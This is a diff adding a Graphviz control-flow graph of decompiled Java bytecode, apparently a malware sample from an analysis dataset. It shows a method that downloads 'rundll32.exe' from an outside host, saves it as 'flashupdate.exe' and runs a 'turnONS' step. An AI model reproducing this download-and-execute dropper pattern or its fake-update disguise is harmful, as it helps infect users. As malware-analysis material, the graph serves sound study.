@@ -1,0 +1,37 @@
+digraph "" {
+    "r0 := @this: Update"
+    "load.r r0"
+    "r0 := @this: Update"->"load.r r0";
+    "new java.lang.StringBuilder"
+    "load.r r0"->"new java.lang.StringBuilder";
+    "dup1.r"
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"http://dadypop.fileave.com/rundll32\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"http://dadypop.fileave.com/rundll32\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \"http://dadypop.fileave.com/rundll32\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \".exe\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".exe\"";
+    "push \".exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"flashupdate\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"flashupdate\"";
+    "push \"flashupdate\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \".exe\"";
+    "push \".exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "staticinvoke <Update: java.lang.String getDir()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"staticinvoke <Update: java.lang.String getDir()>";
+    "virtualinvoke <Update: void Update(java.lang.String,java.lang.String,java.lang.String)>"
+    "staticinvoke <Update: java.lang.String getDir()>"->"virtualinvoke <Update: void Update(java.lang.String,java.lang.String,java.lang.String)>";
+    "staticinvoke <Update: void turnONS()>"
+    "virtualinvoke <Update: void Update(java.lang.String,java.lang.String,java.lang.String)>"->"staticinvoke <Update: void turnONS()>";
+    "return"
+    "staticinvoke <Update: void turnONS()>"->"return";
+}
